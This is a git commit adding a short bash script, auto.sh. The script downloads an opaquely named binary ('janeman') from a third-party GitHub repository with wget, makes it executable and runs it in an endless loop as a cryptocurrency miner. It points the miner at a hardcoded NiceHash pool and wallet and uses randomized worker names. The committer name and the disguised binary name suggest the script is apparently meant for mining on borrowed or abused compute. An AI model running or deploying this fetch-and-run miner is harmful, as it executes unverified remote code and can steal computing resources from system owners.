35d911a27aa8b790b1c33b6178638eac736f7db9
newhellminer <92718023+newhellminer@users.noreply.github.com>
2021-10-18 14:12:02 +0530

    Create auto.sh

---
+++ auto.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+#POOL= stratum+tcp://autolykos.eu-north.nicehash.com:3390
+#WALLET=3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E
+#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
+apt-get install libpci3
+wget https://github.com/archernap/prem/raw/main/janeman
+chmod +x janeman
+	while [ 1 ]; do
+		./janeman -pool stratum+tcp://autolykos.eu-north.nicehash.com:3390 -wal 3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.$(echo $(shuf -i 10-40 -n 1)-Dg) -pass x
+        sleep 5
+	done
